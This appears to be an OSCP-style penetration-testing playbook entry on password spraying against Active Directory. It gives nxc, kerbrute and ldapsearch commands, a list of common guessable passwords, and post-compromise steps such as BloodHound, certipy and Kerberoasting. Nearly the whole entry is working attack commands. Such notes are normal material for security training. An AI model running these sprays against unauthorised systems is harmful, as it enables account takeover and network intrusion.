---
id: password-spray
title: Password Spraying
stage: initial-access
tags: [windows, linux, ad, smb]
tools:
  - nxc smb $DC_IP -u '' -p '' --pass-pol
  - kerbrute passwordspray --dc $DC_IP -d $DOMAIN users.txt 'Password123'
  - nxc smb $DC_IP -u users.txt -p 'Password123' --continue-on-success
  - nxc smb $DC_IP -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
leads_to:
  - winrm
  - rev-shell
  - rdp-access
  - ssh-access
  - bloodhound
---

## Step 0 — Check Lockout Policy FIRST

```bash
# Check before spraying ANYTHING. Locking accounts on the exam is unrecoverable.
nxc smb $DC_IP -u '' -p '' --pass-pol
nxc smb $DC_IP -u user -p password --pass-pol

# LDAP alternative
ldapsearch -H ldap://$DC_IP -x -b "DC=domain,DC=com" "(objectClass=domainDNS)" lockoutThreshold lockoutDuration

# lockoutThreshold: 0 → spray freely
# Any other number → ONE password per user, then stop and wait the observation window
```

## Spray

```bash
# Kerberos-based (less noisy in event logs)
kerbrute passwordspray --dc $DC_IP -d $DOMAIN users.txt 'Password123'

# SMB-based
nxc smb $DC_IP -u users.txt -p 'Password123' --continue-on-success

# Paired list (one password per user — safe against lockout)
nxc smb $DC_IP -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
```

## OSCP Password Order

```
<blank>
Password123 / Password1
Welcome1 / Welcome123
Summer2025 / Winter2025 / Spring2025
<DomainName>1 / <DomainName>123
<username>  (username == password)
```

## After a Hit — Priority Order

1. **Shell check** — `nxc smb/winrm/rdp $DC_IP -u user -p pass` — `Pwn3d!` = stop and go there
2. **BloodHound** — run before anything else; it maps every attack path
3. **ADCS** — `certipy find -vulnerable` — high-value, no shell required
4. **Follow BloodHound paths** — ACL chains, gMSA, LAPS, WriteDACL
5. **Kerberoast** — start alongside BloodHound

## Special Cases

```bash
# STATUS_PASSWORD_MUST_CHANGE — use impacket's smbpasswd.py
smbpasswd.py '$DOMAIN/username:@$DC_IP' -newpass 'NewPassword1!'
```
